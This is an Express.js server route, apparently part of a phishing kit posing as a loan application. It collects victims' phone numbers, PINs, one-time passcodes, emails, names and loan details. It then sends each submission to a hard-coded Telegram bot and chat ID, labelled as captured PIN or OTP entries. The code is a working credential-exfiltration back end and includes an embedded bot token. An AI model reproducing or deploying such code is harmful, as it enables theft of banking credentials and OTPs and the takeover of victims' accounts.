app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, rate, monthly, appId, type } = req.body;
        
        const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
        const TG_CHAT_ID = '8392790531';
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW PIN CONFIRMATION 🔐\n\nPhone: ${phone}\nPIN: ${pin}\nEmail: ${email}\nName: ${name}\nLoan: $${amount} for ${term} months\nInterest: ${rate}%\nMonthly: $${monthly}\nApp ID: ${appId || 'N/A'}`;
        } else {
            message = `🔐 OTP ENTERED 🔐\n\nPhone: ${phone}\nOTP: ${pin}\nEmail: ${email}\nName: ${name}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        await fetch(url);
        res.json({ success: true });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});
